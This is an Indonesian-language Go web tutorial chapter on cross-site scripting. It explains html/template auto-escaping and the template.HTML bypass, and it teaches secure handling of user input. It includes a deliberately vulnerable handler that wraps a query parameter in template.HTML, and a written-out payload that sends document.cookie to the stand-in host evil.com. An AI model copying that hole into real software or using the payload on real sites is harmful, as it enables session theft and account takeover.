# XSS (Cross Site Scripting)

## Gambaran Umum

**XSS (Cross Site Scripting)** adalah celah keamanan di mana penyerang menyuntikkan kode JavaScript berbahaya ke halaman web kita. Tujuannya biasanya untuk mencuri cookie session pengguna, mengambil alih akun, atau memanipulasi tampilan halaman.

```
Contoh serangan XSS:
  Penyerang mengirim: ?body=<script>document.cookie</script>
  Jika tidak di-escape → script dieksekusi di browser korban
  Jika di-escape     → ditampilkan sebagai teks biasa, aman
```

---

## Go dan Auto Escape

Berbeda dengan PHP yang rentan XSS secara default, **`html/template`** di Go secara otomatis meng-escape semua data yang dirender di template — sehingga tag HTML dan JavaScript tidak bisa dieksekusi browser.

> 📖 Referensi fungsi escape: [escape.go](https://github.com/golang/go/blob/master/src/html/template/escape.go)
> 📖 Konteks escape: [html/template contexts](https://pkg.go.dev/html/template#hdr-Contexts)

---

## ⚠️ Penting: `html/template` vs `text/template`

Ini adalah kesalahan yang sangat umum dan **wajib diperhatikan**:

| Package         | Auto Escape HTML      | Cocok untuk               |
| --------------- | --------------------- | ------------------------- |
| `html/template` | ✅ Ya — aman dari XSS | Web, HTML output          |
| `text/template` | ❌ Tidak — rentan XSS | Plain text, email, config |

```go
// ✅ BENAR — gunakan ini untuk web
import "html/template"

// ❌ SALAH — tidak ada auto escape, rentan XSS
import "text/template"
```

Pastikan `myTemplates` dideklarasikan menggunakan `html/template`:

```go
import "html/template" // ← wajib html, bukan text

//go:embed templates/*.gohtml
var templates embed.FS

var myTemplates = template.Must(template.ParseFS(templates, "templates/*.gohtml"))
```

---

## 1. Auto Escape — Perilaku Default

Dengan `html/template`, semua string yang dirender melalui `{{.Field}}` otomatis di-escape:

```go
func TemplateAutoEscape(w http.ResponseWriter, r *http.Request) {
    myTemplates.ExecuteTemplate(w, "post.gohtml", map[string]any{
        "Title": "Template auto escape",
        "Body":  "<p>Ini adalah body</p>", // string biasa → akan di-escape
    })
}

func TestTemplateAutoEscape(t *testing.T) {
    request  := httptest.NewRequest(http.MethodGet, "http://localhost:8080", nil)
    recorder := httptest.NewRecorder()

    TemplateAutoEscape(recorder, request)

    body, _ := io.ReadAll(recorder.Result().Body)
    fmt.Println(string(body))
    // "<p>Ini adalah body</p>" di-escape menjadi:
    // "&lt;p&gt;Ini adalah body&lt;/p&gt;"
    // → ditampilkan sebagai teks, tidak dirender sebagai HTML
}
```

**Cara kerja auto escape:**

```
Data masuk: "<p>Ini adalah body</p>"
        ↓ html/template meng-escape
Output:  "&lt;p&gt;Ini adalah body&lt;/p&gt;"
        ↓ browser membaca
Tampil:  <p>Ini adalah body</p>  (sebagai teks, bukan elemen HTML)
```

---

## 2. Mematikan Auto Escape

Jika kita **benar-benar yakin** data sudah aman, kita bisa menonaktifkan auto escape dengan membungkus data menggunakan tipe khusus:

| Tipe            | Digunakan Untuk                  |
| --------------- | -------------------------------- |
| `template.HTML` | Konten HTML yang dipercaya       |
| `template.CSS`  | Konten CSS yang dipercaya        |
| `template.JS`   | Konten JavaScript yang dipercaya |

```go
func TemplateAutoEscapeDisable(w http.ResponseWriter, r *http.Request) {
    myTemplates.ExecuteTemplate(w, "post.gohtml", map[string]any{
        "Title": "Template auto escape disabled",
        // template.HTML memberitahu Go bahwa konten ini sudah aman
        // dan tidak perlu di-escape
        "Body": template.HTML("<p>Ini adalah body</p>"),
    })
    // Output: <p>Ini adalah body</p> → dirender sebagai paragraf HTML
}
```

---

## 3. Bahaya Mematikan Auto Escape — Contoh XSS

Ini adalah contoh kode yang **berbahaya** — jangan lakukan ini di production:

```go
func TemplateXSS(w http.ResponseWriter, r *http.Request) {
    myTemplates.ExecuteTemplate(w, "post.gohtml", map[string]any{
        "Title": "Template XSS",
        // ❌ SANGAT BERBAHAYA — input langsung dari user dibungkus template.HTML
        // Penyerang bisa mengirim: ?body=<script>alert(document.cookie)</script>
        // dan script tersebut akan dieksekusi di browser korban
        "Body": template.HTML(r.URL.Query().Get("body")),
    })
}
```

**Simulasi serangan:**

```
Penyerang mengirim request:
  GET /page?body=<script>fetch('evil.com?c='+document.cookie)</script>

Karena auto escape dimatikan:
  Script ter-render di browser korban
  Cookie korban terkirim ke server penyerang
  Akun korban berhasil diambil alih
```

---

## Cara Kerja Perbandingan

```
String biasa + html/template:
  "<script>alert(1)</script>"
        ↓ auto escape
  "&lt;script&gt;alert(1)&lt;/script&gt;"
        ↓ browser
  Tampil sebagai teks — AMAN ✅

template.HTML + html/template:
  template.HTML("<script>alert(1)</script>")
        ↓ escape dilewati
  "<script>alert(1)</script>"
        ↓ browser
  Script dieksekusi — BERBAHAYA ❌
```

---

## Alur Penggunaan yang Aman

```
1. Selalu gunakan "html/template" — bukan "text/template"
        ↓
2. Biarkan auto escape bekerja untuk semua input dari user
        ↓
3. Gunakan template.HTML / template.CSS / template.JS HANYA untuk
   konten yang kamu buat sendiri (hardcoded), bukan dari input user
        ↓
4. Jangan pernah membungkus query parameter atau form input
   dengan template.HTML
```

---

## Catatan Penting

| Hal                                     | Keterangan                                                                     |
| --------------------------------------- | ------------------------------------------------------------------------------ |
| **`html/template` wajib**               | Pastikan import menggunakan `html/template`, bukan `text/template`             |
| **Auto escape default**                 | Semua `{{.Field}}` di-escape otomatis — tidak perlu konfigurasi tambahan       |
| **`template.HTML` adalah pengecualian** | Gunakan hanya untuk konten yang kamu kontrol sepenuhnya                        |
| **Jangan percaya input user**           | Query parameter, form, header — semua harus dianggap berbahaya                 |
| **Cookie stealing**                     | XSS yang berhasil bisa mencuri session cookie dan mengambil alih akun pengguna |

---

Next: [Redirect](./23-redirect.md)
